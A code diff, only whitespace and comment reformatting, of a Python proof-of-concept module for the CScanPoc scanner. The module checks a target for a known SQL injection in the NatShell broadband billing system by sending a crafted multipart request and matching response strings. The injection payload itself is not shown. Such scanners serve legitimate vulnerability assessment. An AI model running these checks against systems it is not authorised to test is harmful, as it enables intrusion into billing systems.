@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'NatShell_0001' # 平台漏洞编号，留空
+    vuln_id = 'NatShell_0001'  # 平台漏洞编号，留空
     name = 'NatShell宽带认证计费系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-09-13'  # 漏洞公布时间
     desc = '''
         问题产品地址http://**.**.**.**/renzhengjifeiguanli/
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'NatShell'  # 漏洞应用名称
     product_version = 'NatShell宽带认证计费系统'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'a0a1c063-30d7-4ced-bfe0-1e4b796d1d30'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0140364
+
+            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0140364
             hh = hackhttp.hackhttp()
             payload = ''
             target = self.target + payload
@@ -70,7 +72,7 @@ Content-Disposition: form-data; name="y"
 ------WebKitFormBoundarydrjHY65psp3YsROG--"""
             code, head, res, errcode, _ = hh.http(target, raw=raw)
             if code == 200 and "recharge_user.php" in res and 'user_bill.php' in res:
-                #security_note(target)
+                # security_note(target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -79,6 +81,7 @@ Content-Disposition: form-data; name="y"
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
